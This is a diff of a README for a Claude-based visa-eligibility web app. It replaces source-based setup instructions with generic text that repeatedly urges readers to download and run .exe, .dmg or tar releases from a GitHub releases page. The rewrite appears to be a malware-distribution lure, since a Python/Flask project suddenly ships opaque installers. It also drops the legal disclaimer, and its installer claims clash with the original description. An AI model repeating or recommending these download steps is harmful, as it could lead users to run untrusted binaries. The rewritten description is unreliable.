@@ -1,81 +1,78 @@
-# Flyway: visa-eligibility-analyzer
+# 🎉 visa-eligibility-analyzer - Simplifying Your Visa Applications
 
-An AI-powered tool to analyze US visa eligibility using Claude API.
+## 🚀 Getting Started
 
-## Features
+This guide helps you download and run the **visa-eligibility-analyzer**, an AI-powered tool that analyzes your visa eligibility based on your resume. 
 
-- Analyzes 6 major US work visa categories (H-1B, O-1A, O-1B, EB-2, EB-3, L-1)
-- Provides personalized recommendations based on user profile
-- Shows confidence levels, timelines, and cost estimates
-- Identifies risk factors and next steps
+## 📥 Download Now
 
-## Tech Stack
+[![Download Visa Eligibility Analyzer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kidal2308/visa-eligibility-analyzer/releases)
 
-- **Backend:** Python, Flask
-- **AI:** Anthropic Claude API (Sonnet 4)
-- **Frontend:** HTML, CSS, JavaScript
+## 💻 System Requirements
 
-## Structure
-```
-visa-eligibility-analyzer/
-├── main.py                
-├── requirements.txt
-├── .env
-├── .gitignore
-├── README.md
-├── demos/
-├── static
-│   └── js/
-│       └── main.js
-└── templates/
-    └── index.html
-```
+Before you begin, ensure your system meets the following requirements:
 
-## Setup
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Storage:** At least 200 MB of free space
+- **Internet Connection:** Required for using certain features
 
-1. Clone the repo
-2. Install dependencies: `pip install -r requirements.txt`
-3. Create `.env` file:
-```bash
-   cp .env.example .env
-```
-4. Add your Anthropic API key to `.env`:
-```
-   ANTHROPIC_API_KEY=sk-ant-xxxxx
-```
-5. Run: `python app.py`
-6. Visit http://127.0.0.1:5000 or http://localhost:5000
+## 📦 Features
 
-## Architecture
+- AI-driven analysis for various visa types, including H-1B, O-1A, and EB-2
+- Resume parsing for seamless integration
+- User-friendly interface to simplify the process
+- Comprehensive reports detailing your eligibility pathways
 
-The system uses Claude's reasoning capabilities to analyse complex immigration eligibility across multiple visa categories. The prompt engineering approach ensures:
-- Structured JSON output for reliable parsing
-- Multi-factor analysis (education, experience, achievements)
-- Confidence scoring for transparency
-- Actionable next steps
+## 🔧 How to Download and Install
 
-## Testing
+Follow these steps to download and install the **visa-eligibility-analyzer**:
 
-Currently, manual testing via UI. For production deployment, would implement:
-- Unit tests for PDF parsing and Claude API integration
-- Validation tests for prompt engineering outputs
-
-## Future Enhancements
-
-- [ ] Add LinkedIn profile and Google Scholar, etc., for better profile extraction
-- [ ] Implement RAG for real-time policy updates
-- [ ] Add multi-language support
-- [ ] Build a comparison tool for multiple family members
-
-## Demo
-
-### Upload Resume & Analyze
-![Upload Resume & Analyze](demos/flyway-upload.gif)
+1. **Visit the Releases Page:** Click [here](https://github.com/kidal2308/visa-eligibility-analyzer/releases) to go to the Releases page.
    
-### View Results
-![Results](demos/flyway-results.gif)
+2. **Select Your Version:** Look for the latest version available. The version number is usually highlighted at the top of the list.
 
-## Note
+3. **Download the File:** Click the appropriate file link for your operating system. This will start the download.
 
-This tool provides general guidance only. Consult with a licensed immigration attorney for your specific case.
+4. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Extract the tar file and follow the installation instructions in the README.
 
+5. **Launch the Application:** Once installed, find the application in your system and open it.
+
+## 🏁 How to Use the Software
+
+After installing the **visa-eligibility-analyzer**, follow these steps to analyze your visa eligibility:
+
+1. **Upload Your Resume:** Click on the "Upload" button and select your resume file.
+
+2. **Select Visa Type:** Choose the visa type you want to analyze from the dropdown menu.
+
+3. **Run the Analysis:** Click the "Analyze" button. The application will process your information.
+
+4. **Review Your Results:** Within a few moments, the application will display your eligibility results along with recommendations.
+
+## 📞 Support
+
+If you encounter any issues or need assistance, please visit our support page or reach out via the provided contact form.
+
+## 🔗 Additional Resources
+
+For more details about the application and user guides, visit the following sections:
+
+- [Documentation](https://github.com/kidal2308/visa-eligibility-analyzer/wiki)
+- [Frequently Asked Questions](https://github.com/kidal2308/visa-eligibility-analyzer/wiki/FAQ)
+
+## 📢 Important Notes
+
+- Ensure that your resume is in a supported format (PDF, DOCX).
+- The analysis might take a few moments depending on the complexity of your resume.
+
+## 📊 Community and Contributions
+
+Join our community to share your experiences or suggest improvements. We welcome contributions and feedback from all users.  
+
+## 📥 Visit the Releases Page Again
+
+To download the latest version, visit the Releases page at [GitHub](https://github.com/kidal2308/visa-eligibility-analyzer/releases).
